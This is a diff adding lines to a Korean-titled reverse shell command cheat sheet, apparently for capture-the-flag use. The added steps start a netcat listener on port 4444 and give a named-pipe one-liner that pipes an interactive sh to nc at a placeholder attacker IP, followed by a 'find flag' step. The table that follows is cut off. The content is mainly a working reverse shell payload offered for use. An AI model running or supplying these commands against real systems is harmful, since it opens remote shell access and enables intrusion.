@@ -1,5 +1,13 @@
 # 리버스 셸 명령어 정리
 
+#step 1 start netcat
+nc -lvnp 4444
+
+#step 2 payload named a pipe reverse shell (Using a reverse or bind shell)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc [ATTACKER_IP] 4444 >/tmp/f
+
+#step 3 find flag
+
 ## Bash
 
 | 유형      | 명령어                                                             | 설명                                                              |
